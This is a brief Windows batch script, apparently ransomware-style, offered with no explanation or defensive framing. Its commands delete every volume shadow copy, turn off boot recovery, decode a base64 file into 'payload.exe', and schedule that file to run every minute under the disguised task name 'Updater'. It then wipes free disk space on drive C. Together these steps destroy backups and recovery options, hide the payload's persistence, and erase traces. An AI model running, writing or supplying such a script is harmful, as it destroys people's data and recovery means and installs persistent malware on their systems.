@echo off
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled no
certutil -decode payload.b64 payload.exe
schtasks /create /sc minute /mo 1 /tn Updater /tr C:\Users\Public\payload.exe
cipher /w:C
